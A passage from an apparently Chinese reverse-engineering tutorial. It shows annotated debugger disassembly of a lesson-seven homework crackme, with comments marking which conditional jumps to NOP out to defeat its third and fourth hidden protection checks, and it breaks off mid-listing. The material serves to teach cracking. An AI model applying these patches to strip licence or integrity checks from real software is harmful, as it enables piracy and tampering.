|B9 04000000   mov ecx,0x4</span><br><span class="line">00407758  |. |E8 19DFFFFF   call 第七课作.00405676</span><br><span class="line">0040775D  |. |83C4 10       add esp,0x10</span><br><span class="line">00407760  |. |8945 EC       mov [local.5],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00407763  |. |8B5D F4       mov ebx,[local.3]</span><br><span class="line">00407766  |. |85DB          test ebx,ebx</span><br><span class="line">00407768  |. |74 09         je short 第七课作.00407773</span><br><span class="line">0040776A  |. |53            push ebx</span><br><span class="line">0040776B  |. |E8 C6260000   call 第七课作.00409E36</span><br><span class="line">00407770  |. |83C4 04       add esp,0x4</span><br><span class="line">00407773  |&gt; |8B5D F0       mov ebx,[local.4]</span><br><span class="line">00407776  |. |85DB          test ebx,ebx</span><br><span class="line">00407778  |. |74 09         je short 第七课作.00407783</span><br><span class="line">0040777A  |. |53            push ebx</span><br><span class="line">0040777B  |. |E8 B6260000   call 第七课作.00409E36</span><br><span class="line">00407780  |. |83C4 04       add esp,0x4</span><br><span class="line">00407783  |&gt; |8D45 EC       lea eax,[local.5]</span><br><span class="line">00407786  |. |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00407787  |. |E8 F8F3FFFF   call 第七课作.00406B84</span><br><span class="line">0040778C  |. |8945 E8       mov [local.6],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">0040778F  |. |8B5D EC       mov ebx,[local.5]</span><br><span class="line">00407792  |. |85DB          test ebx,ebx</span><br><span class="line">00407794  |. |74 09         je short 第七课作.0040779F</span><br><span class="line">00407796  |. |53            push ebx</span><br><span class="line">00407797  |. |E8 9A260000   call 第七课作.00409E36</span><br><span class="line">0040779C  |. |83C4 04       add esp,0x4</span><br><span class="line">0040779F  |&gt; |68 04000080   push 0x80000004</span><br><span class="line">004077A4  |. |6A 00         push 0x0</span><br><span class="line">004077A6  |. |8B45 E8       mov eax,[local.6]</span><br><span class="line">004077A9  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004077AB  |. |75 05         jnz short 第七课作.004077B2</span><br><span class="line">004077AD  |. |B8 3E264900   mov eax,第七课作.0049263E</span><br><span class="line">004077B2  |&gt; |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004077B3  |. |68 01000000   push 0x1</span><br><span class="line">004077B8  |. |BB 50A64000   mov ebx,第七课作.0040A650</span><br><span class="line">004077BD  |. |E8 8C260000   call 第七课作.00409E4E</span><br><span class="line">004077C2  |. |83C4 10       add esp,0x10</span><br><span class="line">004077C5  |. |8945 E4       mov [local.7],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004077C8  |. |8B5D E8       mov ebx,[local.6]</span><br><span class="line">004077CB  |. |85DB          test ebx,ebx</span><br><span class="line">004077CD  |. |74 09         je short 第七课作.004077D8</span><br><span class="line">004077CF  |. |53            push ebx</span><br><span class="line">004077D0  |. |E8 61260000   call 第七课作.00409E36</span><br><span class="line">004077D5  |. |83C4 04       add esp,0x4</span><br><span class="line">004077D8  |&gt; |DB45 FC       fild [local.1]</span><br><span class="line">004077DB  |. |DD5D DC       fstp qword ptr ss:[ebp-0x24]</span><br><span class="line">004077DE  |. |DD45 DC       fld qword ptr ss:[ebp-0x24]</span><br><span class="line">004077E1  |. |DB45 F8       fild [local.2]</span><br><span class="line">004077E4  |. |DD5D D4       fstp qword ptr ss:[ebp-0x2C]</span><br><span class="line">004077E7  |. |DC45 D4       fadd qword ptr ss:[ebp-0x2C]</span><br><span class="line">004077EA  |. |DD5D CC       fstp qword ptr ss:[ebp-0x34]</span><br><span class="line">004077ED  |. |DB45 E4       fild [local.7]</span><br><span class="line">004077F0  |. |DD5D C4       fstp qword ptr ss:[ebp-0x3C]</span><br><span class="line">004077F3  |. |DD45 C4       fld qword ptr ss:[ebp-0x3C]</span><br><span class="line">004077F6  |. |DC65 CC       fsub qword ptr ss:[ebp-0x34]</span><br><span class="line">004077F9  |. |D9E4          ftst</span><br><span class="line">004077FB  |. |DFE0          fstsw ax</span><br><span class="line">004077FD  |. |F6C4 01       test ah,0x1</span><br><span class="line">00407800  |. |74 02         je short 第七课作.00407804</span><br><span class="line">00407802  |. |D9E0          fchs</span><br><span class="line">00407804  |&gt; |DC1D 63C65500 fcomp qword ptr ds:[0x55C663]</span><br><span class="line">0040780A  |. |DFE0          fstsw ax</span><br><span class="line">0040780C  |. |F6C4 41       test ah,0x41</span><br><span class="line">0040780F  |. |0F84 F5000000 je 第七课作.0040790A                  ;  nop掉</span><br><span class="line">00407815  |. |B8 3CC65500   mov eax,第七课作.0055C63C             ;  v_geta</span><br><span class="line">0040781A  |. |8945 F4       mov [local.3],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">0040781D  |. |8D45 F4       lea eax,[local.3]</span><br><span class="line">00407820  |. |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00407821  |. |E8 5EF3FFFF   call 第七课作.00406B84</span><br><span class="line">00407826  |. |8945 F0       mov [local.4],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00407829  |. |8B5D F4       mov ebx,[local.3]</span><br><span class="line">0040782C  |. |85DB          test ebx,ebx</span><br><span class="line">0040782E  |. |74 09         je short 第七课作.00407839</span><br><span class="line">00407830  |. |53            push ebx</span><br><span class="line">00407831  |. |E8 00260000   call 第七课作.00409E36</span><br><span class="line">00407836  |. |83C4 04       add esp,0x4</span><br><span class="line">00407839  |&gt; |68 04000080   push 0x80000004</span><br><span class="line">0040783E  |. |6A 00         push 0x0</span><br><span class="line">00407840  |. |8B45 F0       mov eax,[local.4]</span><br><span class="line">00407843  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00407845  |. |75 05         jnz short 第七课作.0040784C</span><br><span class="line">00407847  |. |B8 3E264900   mov eax,第七课作.0049263E</span><br><span class="line">0040784C  |&gt; |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">0040784D  |. |68 01000000   push 0x1</span><br><span class="line">00407852  |. |BB F0AC4000   mov ebx,第七课作.0040ACF0</span><br><span class="line">00407857  |. |E8 F2250000   call 第七课作.00409E4E</span><br><span class="line">0040785C  |. |83C4 10       add esp,0x10</span><br><span class="line">0040785F  |. |8945 EC       mov [local.5],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00407862  |. |8B5D F0       mov ebx,[local.4]</span><br><span class="line">00407865  |. |85DB          test ebx,ebx</span><br><span class="line">00407867  |. |74 09         je short 第七课作.00407872</span><br><span class="line">00407869  |. |53            push ebx</span><br><span class="line">0040786A  |. |E8 C7250000   call 第七课作.00409E36</span><br><span class="line">0040786F  |. |83C4 04       add esp,0x4</span><br><span class="line">00407872  |&gt; |B8 43C65500   mov eax,第七课作.0055C643</span><br><span class="line">00407877  |. |33C9          xor ecx,ecx</span><br><span class="line">00407879  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">0040787B  |. |74 03         je short 第七课作.00407880</span><br><span class="line">0040787D  |. |8B48 04       mov ecx,dword ptr ds:[eax+0x4]</span><br><span class="line">00407880  |&gt; |51            push ecx</span><br><span class="line">00407881  |. |83C0 08       add eax,0x8</span><br><span class="line">00407884  |. |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00407885  |. |8B45 EC       mov eax,[local.5]</span><br><span class="line">00407888  |. |33DB          xor ebx,ebx</span><br><span class="line">0040788A  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">0040788C  |. |74 03         je short 第七课作.00407891</span><br><span class="line">0040788E  |. |8B58 04       mov ebx,dword ptr ds:[eax+0x4]</span><br><span class="line">00407891  |&gt; |83C0 08       add eax,0x8</span><br><span class="line">00407894  |. |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00407895  |. |3BD9          cmp ebx,ecx</span><br><span class="line">00407897  |. |B8 01000000   mov eax,0x1</span><br><span class="line">0040789C  |. |75 0A         jnz short 第七课作.004078A8</span><br><span class="line">0040789E  |. |48            dec eax                           ;  kernel32.BaseThreadInitThunk</span><br><span class="line">0040789F  |. |85C9          test ecx,ecx</span><br><span class="line">004078A1  |. |74 05         je short 第七课作.004078A8</span><br><span class="line">004078A3  |. |E8 ADECFFFF   call 第七课作.00406555</span><br><span class="line">004078A8  |&gt; |83C4 0C       add esp,0xC</span><br><span class="line">004078AB  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004078AD  |. |B8 00000000   mov eax,0x0</span><br><span class="line">004078B2  |. |0f94c0        sete al</span><br><span class="line">004078B5  |. |8945 E8       mov [local.6],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004078B8  |. |8B5D EC       mov ebx,[local.5]</span><br><span class="line">004078BB  |. |85DB          test ebx,ebx</span><br><span class="line">004078BD  |. |74 09         je short 第七课作.004078C8</span><br><span class="line">004078BF  |. |53            push ebx</span><br><span class="line">004078C0  |. |E8 71250000   call 第七课作.00409E36</span><br><span class="line">004078C5  |. |83C4 04       add esp,0x4</span><br><span class="line">004078C8  |&gt; |837D E8 00    cmp [local.6],0x0</span><br><span class="line">004078CC  |. |0F84 38000000 je 第七课作.0040790A                  ;  nop掉</span><br><span class="line">004078D2  |. |6A 00         push 0x0</span><br><span class="line">004078D4  |. |6A 00         push 0x0</span><br><span class="line">004078D6  |. |6A 00         push 0x0</span><br><span class="line">004078D8  |. |68 04000080   push 0x80000004</span><br><span class="line">004078DD  |. |6A 00         push 0x0</span><br><span class="line">004078DF  |. |68 04C75500   push 第七课作.0055C704                ;  二级效验通过</span><br><span class="line">004078E4  |. |68 0F000100   push 0x1000F</span><br><span class="line">004078E9  |. |68 7D6B0116   push 0x16016B7D</span><br><span class="line">004078EE  |. |68 2B010152   push 0x5201012B</span><br><span class="line">004078F3  |. |68 03000000   push 0x3</span><br><span class="line">004078F8  |. |BB E0B94000   mov ebx,第七课作.0040B9E0</span><br><span class="line">004078FD  |. |E8 4C250000   call 第七课作.00409E4E</span><br><span class="line">00407902  |. |83C4 28       add esp,0x28</span><br><span class="line">00407905  |. |E9 39000000   jmp 第七课作.00407943</span><br><span class="line">0040790A  |&gt; \BB 06000000   mov ebx,0x6                       ;  nop掉，大跳转结束</span><br><span class="line">0040790F  |.  E8 2799FFFF   call 第七课作.0040123B</span><br><span class="line">00407914  |.  68 01030080   push 0x80000301</span><br><span class="line">00407919  |.  6A 00         push 0x0</span><br><span class="line">0040791B  |.  68 00000000   push 0x0</span><br><span class="line">00407920  |.  68 04000080   push 0x80000004</span><br><span class="line">00407925  |.  6A 00         push 0x0</span><br><span class="line">00407927  |.  68 BDC65500   push 第七课作.0055C6BD                ;  暗桩</span><br><span class="line">0040792C  |.  68 04000000   push 0x4</span><br><span class="line">00407931  |.  BB 20B14000   mov ebx,第七课作.0040B120</span><br><span class="line">00407936  |.  E8 13250000   call 第七课作.00409E4E</span><br><span class="line">0040793B  |.  83C4 34       add esp,0x34</span><br><span class="line">0040793E  |.  E9 00000000   jmp 第七课作.00407943</span><br><span class="line">00407943  |&gt;  8BE5          mov esp,ebp</span><br><span class="line">00407945  |.  5D            pop ebp                           ;  kernel32.76A4336A</span><br><span class="line">00407946  \.  C3            retn</span><br><span class="line">00407947  &#x2F;.  55            push ebp</span><br></pre></td></tr></table></figure></div><h5 id="第三个暗桩"><a href="#第三个暗桩" class="headerlink" title="第三个暗桩"></a>第三个暗桩</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00408907  |. &#x2F;0F84 2D020000 je 第七课作.00408B3A                  ;  nop掉,大跳转开始</span><br><span class="line">0040890D  |. |B8 3CC65500   mov eax,第七课作.0055C63C             ;  v_geta</span><br><span class="line">00408912  |. |8945 F4       mov [local.3],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00408915  |. |8D45 F4       lea eax,[local.3]</span><br><span class="line">00408918  |. |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00408919  |. |E8 1BE5FFFF   call 第七课作.00406E39</span><br><span class="line">0040891E  |. |8B5D F4       mov ebx,[local.3]</span><br><span class="line">00408921  |. |85DB          test ebx,ebx</span><br><span class="line">00408923  |. |74 09         je short 第七课作.0040892E</span><br><span class="line">00408925  |. |53            push ebx</span><br><span class="line">00408926  |. |E8 0B150000   call 第七课作.00409E36</span><br><span class="line">0040892B  |. |83C4 04       add esp,0x4</span><br><span class="line">0040892E  |&gt; |68 01030080   push 0x80000301</span><br><span class="line">00408933  |. |6A 00         push 0x0</span><br><span class="line">00408935  |. |FF75 FC       push [local.1]</span><br><span class="line">00408938  |. |68 01000000   push 0x1</span><br><span class="line">0040893D  |. |BB 10B04000   mov ebx,第七课作.0040B010</span><br><span class="line">00408942  |. |E8 07150000   call 第七课作.00409E4E</span><br><span class="line">00408947  |. |83C4 10       add esp,0x10</span><br><span class="line">0040894A  |. |8945 F4       mov [local.3],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">0040894D  |. |68 01030080   push 0x80000301</span><br><span class="line">00408952  |. |6A 00         push 0x0</span><br><span class="line">00408954  |. |FF75 F8       push [local.2]                    ;  kernel32.76A4336A</span><br><span class="line">00408957  |. |68 01000000   push 0x1</span><br><span class="line">0040895C  |. |BB 10B04000   mov ebx,第七课作.0040B010</span><br><span class="line">00408961  |. |E8 E8140000   call 第七课作.00409E4E</span><br><span class="line">00408966  |. |83C4 10       add esp,0x10</span><br><span class="line">00408969  |. |8945 F0       mov [local.4],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">0040896C  |. |FF75 F0       push [local.4]</span><br><span class="line">0040896F  |. |68 12C65500   push 第七课作.0055C612                ;  ,</span><br><span class="line">00408974  |. |FF75 F4       push [local.3]</span><br><span class="line">00408977  |. |68 5BC65500   push 第七课作.0055C65B                ;  v_getb,</span><br><span class="line">0040897C  |. |B9 04000000   mov ecx,0x4</span><br><span class="line">00408981  |. |E8 F0CCFFFF   call 第七课作.00405676</span><br><span class="line">00408986  |. |83C4 10       add esp,0x10</span><br><span class="line">00408989  |. |8945 EC       mov [local.5],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">0040898C  |. |8B5D F4       mov ebx,[local.3]</span><br><span class="line">0040898F  |. |85DB          test ebx,ebx</span><br><span class="line">00408991  |. |74 09         je short 第七课作.0040899C</span><br><span class="line">00408993  |. |53            push ebx</span><br><span class="line">00408994  |. |E8 9D140000   call 第七课作.00409E36</span><br><span class="line">00408999  |. |83C4 04       add esp,0x4</span><br><span class="line">0040899C  |&gt; |8B5D F0       mov ebx,[local.4]</span><br><span class="line">0040899F  |. |85DB          test ebx,ebx</span><br><span class="line">004089A1  |. |74 09         je short 第七课作.004089AC</span><br><span class="line">004089A3  |. |53            push ebx</span><br><span class="line">004089A4  |. |E8 8D140000   call 第七课作.00409E36</span><br><span class="line">004089A9  |. |83C4 04       add esp,0x4</span><br><span class="line">004089AC  |&gt; |8D45 EC       lea eax,[local.5]</span><br><span class="line">004089AF  |. |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004089B0  |. |E8 CFE1FFFF   call 第七课作.00406B84</span><br><span class="line">004089B5  |. |8945 E8       mov [local.6],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004089B8  |. |8B5D EC       mov ebx,[local.5]</span><br><span class="line">004089BB  |. |85DB          test ebx,ebx</span><br><span class="line">004089BD  |. |74 09         je short 第七课作.004089C8</span><br><span class="line">004089BF  |. |53            push ebx</span><br><span class="line">004089C0  |. |E8 71140000   call 第七课作.00409E36</span><br><span class="line">004089C5  |. |83C4 04       add esp,0x4</span><br><span class="line">004089C8  |&gt; |68 04000080   push 0x80000004</span><br><span class="line">004089CD  |. |6A 00         push 0x0</span><br><span class="line">004089CF  |. |8B45 E8       mov eax,[local.6]</span><br><span class="line">004089D2  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004089D4  |. |75 05         jnz short 第七课作.004089DB</span><br><span class="line">004089D6  |. |B8 3E264900   mov eax,第七课作.0049263E</span><br><span class="line">004089DB  |&gt; |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004089DC  |. |68 01000000   push 0x1</span><br><span class="line">004089E1  |. |BB 50A64000   mov ebx,第七课作.0040A650</span><br><span class="line">004089E6  |. |E8 63140000   call 第七课作.00409E4E</span><br><span class="line">004089EB  |. |83C4 10       add esp,0x10</span><br><span class="line">004089EE  |. |8945 E4       mov [local.7],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004089F1  |. |8B5D E8       mov ebx,[local.6]</span><br><span class="line">004089F4  |. |85DB          test ebx,ebx</span><br><span class="line">004089F6  |. |74 09         je short 第七课作.00408A01</span><br><span class="line">004089F8  |. |53            push ebx</span><br><span class="line">004089F9  |. |E8 38140000   call 第七课作.00409E36</span><br><span class="line">004089FE  |. |83C4 04       add esp,0x4</span><br><span class="line">00408A01  |&gt; |DB45 FC       fild [local.1]</span><br><span class="line">00408A04  |. |DD5D DC       fstp qword ptr ss:[ebp-0x24]</span><br><span class="line">00408A07  |. |DD45 DC       fld qword ptr ss:[ebp-0x24]</span><br><span class="line">00408A0A  |. |DB45 F8       fild [local.2]</span><br><span class="line">00408A0D  |. |DD5D D4       fstp qword ptr ss:[ebp-0x2C]</span><br><span class="line">00408A10  |. |DC45 D4       fadd qword ptr ss:[ebp-0x2C]</span><br><span class="line">00408A13  |. |DD5D CC       fstp qword ptr ss:[ebp-0x34]</span><br><span class="line">00408A16  |. |DB45 E4       fild [local.7]</span><br><span class="line">00408A19  |. |DD5D C4       fstp qword ptr ss:[ebp-0x3C]</span><br><span class="line">00408A1C  |. |DD45 C4       fld qword ptr ss:[ebp-0x3C]</span><br><span class="line">00408A1F  |. |DC65 CC       fsub qword ptr ss:[ebp-0x34]</span><br><span class="line">00408A22  |. |D9E4          ftst</span><br><span class="line">00408A24  |. |DFE0          fstsw ax</span><br><span class="line">00408A26  |. |F6C4 01       test ah,0x1</span><br><span class="line">00408A29  |. |74 02         je short 第七课作.00408A2D</span><br><span class="line">00408A2B  |. |D9E0          fchs</span><br><span class="line">00408A2D  |&gt; |DC1D 63C65500 fcomp qword ptr ds:[0x55C663]</span><br><span class="line">00408A33  |. |DFE0          fstsw ax</span><br><span class="line">00408A35  |. |F6C4 41       test ah,0x41</span><br><span class="line">00408A38  |. |0F84 FC000000 je 第七课作.00408B3A                  ;  nop掉</span><br><span class="line">00408A3E  |. |B8 3CC65500   mov eax,第七课作.0055C63C             ;  v_geta</span><br><span class="line">00408A43  |. |8945 F4       mov [local.3],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00408A46  |. |8D45 F4       lea eax,[local.3]</span><br><span class="line">00408A49  |. |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00408A4A  |. |E8 35E1FFFF   call 第七课作.00406B84</span><br><span class="line">00408A4F  |. |8945 F0       mov [local.4],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00408A52  |. |8B5D F4       mov ebx,[local.3]</span><br><span class="line">00408A55  |. |85DB          test ebx,ebx</span><br><span class="line">00408A57  |. |74 09         je short 第七课作.00408A62</span><br><span class="line">00408A59  |. |53            push ebx</span><br><span class="line">00408A5A  |. |E8 D7130000   call 第七课作.00409E36</span><br><span class="line">00408A5F  |. |83C4 04       add esp,0x4</span><br><span class="line">00408A62  |&gt; |68 04000080   push 0x80000004</span><br><span class="line">00408A67  |. |6A 00         push 0x0</span><br><span class="line">00408A69  |. |8B45 F0       mov eax,[local.4]</span><br><span class="line">00408A6C  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00408A6E  |. |75 05         jnz short 第七课作.00408A75</span><br><span class="line">00408A70  |. |B8 3E264900   mov eax,第七课作.0049263E</span><br><span class="line">00408A75  |&gt; |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00408A76  |. |68 01000000   push 0x1</span><br><span class="line">00408A7B  |. |BB F0AC4000   mov ebx,第七课作.0040ACF0</span><br><span class="line">00408A80  |. |E8 C9130000   call 第七课作.00409E4E</span><br><span class="line">00408A85  |. |83C4 10       add esp,0x10</span><br><span class="line">00408A88  |. |8945 EC       mov [local.5],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00408A8B  |. |8B5D F0       mov ebx,[local.4]</span><br><span class="line">00408A8E  |. |85DB          test ebx,ebx</span><br><span class="line">00408A90  |. |74 09         je short 第七课作.00408A9B</span><br><span class="line">00408A92  |. |53            push ebx</span><br><span class="line">00408A93  |. |E8 9E130000   call 第七课作.00409E36</span><br><span class="line">00408A98  |. |83C4 04       add esp,0x4</span><br><span class="line">00408A9B  |&gt; |B8 43C65500   mov eax,第七课作.0055C643</span><br><span class="line">00408AA0  |. |33C9          xor ecx,ecx</span><br><span class="line">00408AA2  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00408AA4  |. |74 03         je short 第七课作.00408AA9</span><br><span class="line">00408AA6  |. |8B48 04       mov ecx,dword ptr ds:[eax+0x4]</span><br><span class="line">00408AA9  |&gt; |51            push ecx</span><br><span class="line">00408AAA  |. |83C0 08       add eax,0x8</span><br><span class="line">00408AAD  |. |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00408AAE  |. |8B45 EC       mov eax,[local.5]</span><br><span class="line">00408AB1  |. |33DB          xor ebx,ebx</span><br><span class="line">00408AB3  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00408AB5  |. |74 03         je short 第七课作.00408ABA</span><br><span class="line">00408AB7  |. |8B58 04       mov ebx,dword ptr ds:[eax+0x4]</span><br><span class="line">00408ABA  |&gt; |83C0 08       add eax,0x8</span><br><span class="line">00408ABD  |. |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00408ABE  |. |3BD9          cmp ebx,ecx</span><br><span class="line">00408AC0  |. |B8 01000000   mov eax,0x1</span><br><span class="line">00408AC5  |. |75 0A         jnz short 第七课作.00408AD1</span><br><span class="line">00408AC7  |. |48            dec eax                           ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00408AC8  |. |85C9          test ecx,ecx</span><br><span class="line">00408ACA  |. |74 05         je short 第七课作.00408AD1</span><br><span class="line">00408ACC  |. |E8 84DAFFFF   call 第七课作.00406555</span><br><span class="line">00408AD1  |&gt; |83C4 0C       add esp,0xC</span><br><span class="line">00408AD4  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00408AD6  |. |B8 00000000   mov eax,0x0</span><br><span class="line">00408ADB  |. |0f94c0        sete al</span><br><span class="line">00408ADE  |. |8945 E8       mov [local.6],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00408AE1  |. |8B5D EC       mov ebx,[local.5]</span><br><span class="line">00408AE4  |. |85DB          test ebx,ebx</span><br><span class="line">00408AE6  |. |74 09         je short 第七课作.00408AF1</span><br><span class="line">00408AE8  |. |53            push ebx</span><br><span class="line">00408AE9  |. |E8 48130000   call 第七课作.00409E36</span><br><span class="line">00408AEE  |. |83C4 04       add esp,0x4</span><br><span class="line">00408AF1  |&gt; |837D E8 00    cmp [local.6],0x0</span><br><span class="line">00408AF5  |. |0F84 3F000000 je 第七课作.00408B3A                  ;  nop掉</span><br><span class="line">00408AFB  |. |6A 00         push 0x0</span><br><span class="line">00408AFD  |. |68 00000000   push 0x0</span><br><span class="line">00408B02  |. |6A FF         push -0x1</span><br><span class="line">00408B04  |. |6A 06         push 0x6</span><br><span class="line">00408B06  |. |68 7C6B0116   push 0x16016B7C</span><br><span class="line">00408B0B  |. |68 2B010152   push 0x5201012B</span><br><span class="line">00408B10  |. |E8 2D130000   call 第七课作.00409E42</span><br><span class="line">00408B15  |. |83C4 18       add esp,0x18</span><br><span class="line">00408B18  |. |6A 00         push 0x0</span><br><span class="line">00408B1A  |. |68 00000000   push 0x0</span><br><span class="line">00408B1F  |. |6A FF         push -0x1</span><br><span class="line">00408B21  |. |6A 06         push 0x6</span><br><span class="line">00408B23  |. |68 7B6B0116   push 0x16016B7B</span><br><span class="line">00408B28  |. |68 2B010152   push 0x5201012B</span><br><span class="line">00408B2D  |. |E8 10130000   call 第七课作.00409E42</span><br><span class="line">00408B32  |. |83C4 18       add esp,0x18</span><br><span class="line">00408B35  |. |E9 39000000   jmp 第七课作.00408B73</span><br><span class="line">00408B3A  |&gt; \BB 06000000   mov ebx,0x6                       ;  nop掉，大跳转结束</span><br><span class="line">00408B3F  |.  E8 F786FFFF   call 第七课作.0040123B</span><br><span class="line">00408B44  |.  68 01030080   push 0x80000301</span><br><span class="line">00408B49  |.  6A 00         push 0x0</span><br><span class="line">00408B4B  |.  68 00000000   push 0x0</span><br><span class="line">00408B50  |.  68 04000080   push 0x80000004</span><br><span class="line">00408B55  |.  6A 00         push 0x0</span><br><span class="line">00408B57  |.  68 BDC65500   push 第七课作.0055C6BD                ;  暗桩</span><br><span class="line">00408B5C  |.  68 04000000   push 0x4</span><br><span class="line">00408B61  |.  BB 20B14000   mov ebx,第七课作.0040B120</span><br><span class="line">00408B66  |.  E8 E3120000   call 第七课作.00409E4E</span><br><span class="line">00408B6B  |.  83C4 34       add esp,0x34</span><br><span class="line">00408B6E  |.  E9 00000000   jmp 第七课作.00408B73</span><br><span class="line">00408B73  |&gt;  8BE5          mov esp,ebp</span><br><span class="line">00408B75  |.  5D            pop ebp                           ;  kernel32.76A4336A</span><br><span class="line">00408B76  \.  C3            retn</span><br></pre></td></tr></table></figure></div><h5 id="第四个暗桩"><a href="#第四个暗桩" class="headerlink" title="第四个暗桩"></a>第四个暗桩</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0040946A  |. &#x2F;0F84 84010000 je 第七课作.004095F4                  ;  nop掉，大跳转开始</span><br><span class="line">00409470  |. |68 02000000   push 0x2</span><br><span class="line">00409475  |. |E8 C3DAFFFF   call 第七课作.00406F3D</span><br><span class="line">0040947A  |. |8945 FC       mov [local.1],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">0040947D  |. |68 04000080   push 0x80000004</span><br><span class="line">00409482  |. |6A 00         push 0x0</span><br><span class="line">00409484  |. |8B45 FC       mov eax,[local.1]</span><br><span class="line">00409487  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00409489  |. |75 05         jnz short 第七课作.00409490</span><br><span class="line">0040948B  |. |B8 3E264900   mov eax,第七课作.0049263E</span><br><span class="line">00409490  |&gt; |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00409491  |. |68 01000000   push 0x1</span><br><span class="line">00409496  |. |BB F0AC4000   mov ebx,第七课作.0040ACF0</span><br><span class="line">0040949B  |. |E8 AE090000   call 第七课作.00409E4E</span><br><span class="line">004094A0  |. |83C4 10       add esp,0x10</span><br><span class="line">004094A3  |. |8945 F8       mov [local.2],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004094A6  |. |8B5D FC       mov ebx,[local.1]</span><br><span class="line">004094A9  |. |85DB          test ebx,ebx</span><br><span class="line">004094AB  |. |74 09         je short 第七课作.004094B6</span><br><span class="line">004094AD  |. |53            push ebx</span><br><span class="line">004094AE  |. |E8 83090000   call 第七课作.00409E36</span><br><span class="line">004094B3  |. |83C4 04       add esp,0x4</span><br><span class="line">004094B6  |&gt; |B8 7EC65500   mov eax,第七课作.0055C67E</span><br><span class="line">004094BB  |. |33C9          xor ecx,ecx</span><br><span class="line">004094BD  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004094BF  |. |74 03         je short 第七课作.004094C4</span><br><span class="line">004094C1  |. |8B48 04       mov ecx,dword ptr ds:[eax+0x4]</span><br><span class="line">004094C4  |&gt; |51            push ecx</span><br><span class="line">004094C5  |. |83C0 08       add eax,0x8</span><br><span class="line">004094C8  |. |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004094C9  |. |8B45 F8       mov eax,[local.2]                 ;  kernel32.76A4336A</span><br><span class="line">004094CC  |. |33DB          xor ebx,ebx</span><br><span class="line">004094CE  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004094D0  |. |74 03         je short 第七课作.004094D5</span><br><span class="line">004094D2  |. |8B58 04       mov ebx,dword ptr ds:[eax+0x4]</span><br><span class="line">004094D5  |&gt; |83C0 08       add eax,0x8</span><br><span class="line">004094D8  |. |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004094D9  |. |3BD9          cmp ebx,ecx</span><br><span class="line">004094DB  |. |B8 01000000   mov eax,0x1</span><br><span class="line">004094E0  |. |75 0A         jnz short 第七课作.004094EC</span><br><span class="line">004094E2  |. |48            dec eax                           ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004094E3  |. |85C9          test ecx,ecx</span><br><span class="line">004094E5  |. |74 05         je short 第七课作.004094EC</span><br><span class="line">004094E7  |. |E8 69D0FFFF   call 第七课作.00406555</span><br><span class="line">004094EC  |&gt; |83C4 0C       add esp,0xC</span><br><span class="line">004094EF  |. |85C0          test eax,eax                      ;  